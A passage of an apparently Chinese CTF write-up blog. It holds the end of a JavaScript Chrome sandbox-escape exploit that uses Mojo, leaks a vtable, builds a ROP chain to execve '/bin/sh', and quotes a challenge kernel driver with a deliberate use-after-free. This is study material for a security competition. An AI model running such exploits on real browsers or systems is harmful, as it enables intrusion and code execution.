    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">ctfCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> ctf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">blink<span class="token punctuation">.</span>mojom<span class="token punctuation">.</span>CtfInterfacePtr</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> req <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mojo<span class="token punctuation">.</span>makeRequest</span><span class="token punctuation">(</span>ctf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        Mojo<span class="token punctuation">.</span><span class="token function">bindInterface</span><span class="token punctuation">(</span>blink<span class="token punctuation">.</span>mojom<span class="token punctuation">.</span>CtfInterface<span class="token punctuation">.</span>name<span class="token punctuation">,</span> req<span class="token punctuation">.</span>handle<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> ctf<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


    <span class="token keyword">let</span> vec_base <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> vec_end <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> size <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> rop_len <span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> vtable <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> vtable_offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> ctf<span class="token punctuation">,</span> arb<span class="token punctuation">;</span>

    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'finding vector address...'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>vtable_offset <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        ctf <span class="token operator">=</span> <span class="token function">ctfCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        arb <span class="token operator">=</span> <span class="token function">ctfCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">await</span> <span class="token function">ctfResize</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">await</span> <span class="token function">ctfResize</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> rop_len<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token number">0xfebabedeadbeefn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> rop_len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token number">0xfebabedeadbeefn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">let</span> val <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">ctfRead</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>val <span class="token operator">&amp;</span> <span class="token number">0xfffn</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x4e0n</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//(vtable &amp; 0xfff) == 0x4e0</span>
                <span class="token keyword">let</span> base <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">ctfRead</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">let</span> end <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">ctfRead</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                
                <span class="token keyword">if</span> <span class="token punctuation">(</span>end <span class="token operator">></span> base <span class="token operator">&amp;&amp;</span> <span class="token function">Number</span><span class="token punctuation">(</span>end <span class="token operator">-</span> base<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">8</span> <span class="token operator">*</span> rop_len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// found!</span>
                    vtable <span class="token operator">=</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    vec_base <span class="token operator">=</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    vec_end <span class="token operator">=</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>end<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    vtable_offset <span class="token operator">=</span> i<span class="token punctuation">;</span>

                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>vtable_offset<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">: vtable = 0x</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>vtable<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, vec_base = 0x</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>vec_base<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, vec_end = 0x</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>vec_end<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>

            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token comment">// for (let i = 4; i &lt; 0x1000; i++)</span>
    <span class="token punctuation">&#125;</span> <span class="token comment">// while (vec_base == 0)</span>

    <span class="token comment">// async function arb_read(addr) &#123;    </span>
    <span class="token comment">//     await ctfWrite(ctf, vtable_offset+1, addr);</span>
    <span class="token comment">//     await ctfWrite(ctf, vtable_offset+2, addr+8n);</span>

    <span class="token comment">//     let val = await ctfRead(arb, 0);</span>

    <span class="token comment">//     await ctfWrite(ctf, vtable_offset+1, vec_base);</span>
    <span class="token comment">//     await ctfWrite(ctf, vtable_offset+2, vec_end);</span>

    <span class="token comment">//     return val;</span>
    <span class="token comment">// &#125;</span>

    <span class="token comment">// async function arb_write(addr, val) &#123;    </span>
    <span class="token comment">//     await ctfWrite(ctf, vtable_offset+1, addr);</span>
    <span class="token comment">//     await ctfWrite(ctf, vtable_offset+2, addr+8n);</span>

    <span class="token comment">//     let val = await ctfWrite(arb, 0, val);</span>

    <span class="token comment">//     await ctfWrite(ctf, vtable_offset+1, vec_base);</span>
    <span class="token comment">//     await ctfWrite(ctf, vtable_offset+2, vec_end);</span>

    <span class="token comment">//     return val;</span>
    <span class="token comment">// &#125;</span>
    
    <span class="token keyword">let</span> chrome_base <span class="token operator">=</span> vtable <span class="token operator">-</span> <span class="token number">0xbc774e0n</span><span class="token punctuation">;</span>
    <span class="token comment">// let execve_got = chrome_base + 0x0000c2cf5f8n;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">chrome_base = </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>chrome_base<span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// let execve = await arb_read(execve_got);</span>
    <span class="token keyword">let</span> execve_plt <span class="token operator">=</span> chrome_base <span class="token operator">+</span> <span class="token number">0xbb89d50n</span><span class="token punctuation">;</span>


    <span class="token comment">// let __libc_start_main_got = chrome_base + 0xC29C0C0n;</span>
    <span class="token comment">// await ctfWrite(ctf, vtable_offset+1, __libc_start_main_got);</span>
    <span class="token comment">// await ctfWrite(ctf, vtable_offset+2, __libc_start_main_got+8n);</span>

    <span class="token comment">// let __libc_start_main = await ctfRead(arb, 0);</span>
    <span class="token comment">// console.log(`printf = $&#123;__libc_start_main.hex()&#125;`);</span>
    
    <span class="token comment">// let lbase = __libc_start_main - 0x26fc0n;</span>
    <span class="token comment">// let system = lbase + 0x55410n</span>


    <span class="token comment">// // restore</span>
    <span class="token comment">// await ctfWrite(ctf, vtable_offset+1, vec_base);</span>
    <span class="token comment">// await ctfWrite(ctf, vtable_offset+2, vec_end);</span>


    
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'write rop ...'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">let</span> fake_vtable <span class="token operator">=</span> vec_base<span class="token punctuation">;</span>
    <span class="token keyword">let</span> rop_base <span class="token operator">=</span> vec_base<span class="token punctuation">;</span>

    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> <span class="token number">0x3d994e1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// add rsp, 0x20; pop rbp; ret;</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> <span class="token number">0x590510en</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// xchg rax, rsp; ret; -> ResizeVector (rax = vtable)</span>
    
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> <span class="token number">0x37bb280n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// pop rdi</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> rop_base<span class="token operator">+</span><span class="token number">14n</span><span class="token operator">*</span><span class="token number">8n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// addrOf"/bin/sh"</span>
    
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> <span class="token number">0x099b8ee0n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// pop rsi</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> rop_base <span class="token operator">+</span> <span class="token number">13n</span> <span class="token operator">*</span> <span class="token number">8n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// args</span>
    
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> <span class="token number">0x3655332n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// pop rdx</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> rop_base <span class="token operator">+</span> <span class="token number">13n</span> <span class="token operator">*</span> <span class="token number">8n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// env</span>

    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> execve_plt<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// env</span>
    <span class="token comment">// await ctfWrite(arb, 13, rop_base + 14n * 8n);       // addrOf"/bin/sh"</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">0n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">// NULL</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">0x68732f6e69622fn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// "/bin/sh"</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">// NULL</span>

    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'change vtable ...'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> vtable_offset<span class="token punctuation">,</span> fake_vtable<span class="token punctuation">)</span><span class="token punctuation">;</span>

    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'pwn!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> <span class="token function">ctfResize</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">0x2333</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>Mojo<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'undefined'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"enabling mojo ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">enable_mojo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"sandbox escape ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">await</span> <span class="token function">sandbox_escape</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p><img src="/images/68622871/13.png" alt="pwn"></p>
<p><strong>注意：</strong> script 引入的 mojo 目录实际上是题目的 mojo_bindings 目录<br><img src="/images/68622871/12.png" alt="mojo_bindings"></p>
<h3 id="简单的-kernel-pwn"><a href="#简单的-kernel-pwn" class="headerlink" title="简单的 kernel pwn"></a>简单的 kernel pwn</h3><p>逃逸拿到 shell 后就是 kernel pwn 提权了，题目直接就给了驱动的源码：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

<span class="token keyword">struct</span> <span class="token class-name">ctf_data</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>mem<span class="token punctuation">;</span>
  <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">cdev</span> ctf_cdev<span class="token punctuation">;</span>
<span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">file_operations</span> ctf_fops <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token punctuation">.</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>
  <span class="token punctuation">.</span>open <span class="token operator">=</span> ctf_open<span class="token punctuation">,</span>
  <span class="token punctuation">.</span>release <span class="token operator">=</span> ctf_release<span class="token punctuation">,</span>
  <span class="token punctuation">.</span>read <span class="token operator">=</span> ctf_read<span class="token punctuation">,</span>
  <span class="token punctuation">.</span>write <span class="token operator">=</span> ctf_write<span class="token punctuation">,</span>
  <span class="token punctuation">.</span>unlocked_ioctl <span class="token operator">=</span> ctf_ioctl<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">ctf_read</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>data<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span>off<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">struct</span> <span class="token class-name">ctf_data</span> <span class="token operator">*</span>ctf_data <span class="token operator">=</span> f<span class="token operator">-></span>private_data<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">></span> ctf_data<span class="token operator">-></span>size<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_to_user</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> ctf_data<span class="token operator">-></span>mem<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span>EFAULT<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">return</span> size<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">ctf_write</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>data<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span>off<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">struct</span> <span class="token class-name">ctf_data</span> <span class="token operator">*</span>ctf_data <span class="token operator">=</span> f<span class="token operator">-></span>private_data<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">></span> ctf_data<span class="token operator">-></span>size<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>ctf_data<span class="token operator">-></span>mem<span class="token punctuation">,</span> data<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span>EFAULT<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">return</span> size<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">ctf_ioctl</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> cmd<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">struct</span> <span class="token class-name">ctf_data</span> <span class="token operator">*</span>data <span class="token operator">=</span> f<span class="token operator">-></span>private_data<span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>mem<span class="token punctuation">;</span>

  <span class="token keyword">switch</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">case</span> <span class="token number">1337</span><span class="token operator">:</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>arg <span class="token operator">></span> <span class="token number">2000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    mem <span class="token operator">=</span> <span class="token function">kmalloc</span><span class="token punctuation">(</span>arg<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>mem <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    data<span class="token operator">-></span>mem <span class="token operator">=</span> mem<span class="token punctuation">;</span>
    data<span class="token operator">-></span>size <span class="token operator">=</span> arg<span class="token punctuation">;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>

  <span class="token keyword">case</span> <span class="token number">1338</span><span class="token operator">:</span>
    <span class="token function">kfree</span><span class="token punctuation">(</span>data<span class="token operator">-></span>mem<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>

  <span class="token keyword">default</span><span class="token operator">:</span>
    <span class="token keyword">return</span> <span class="token operator">-</span>ENOTTY<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">ctf_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">struct</span> <span class="token class-name">ctf_data</span> <span class="token operator">*</span>data <span class="token operator">=</span> <span class="token function">kzalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ctf_data</span><span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>data <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  f<span class="token operator">-></span>private_data <span class="token operator">=</span> data<span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">ctf_release</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">kfree</span><span class="token punctuation">(</span>f<span class="token operator">-></span>private_data<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
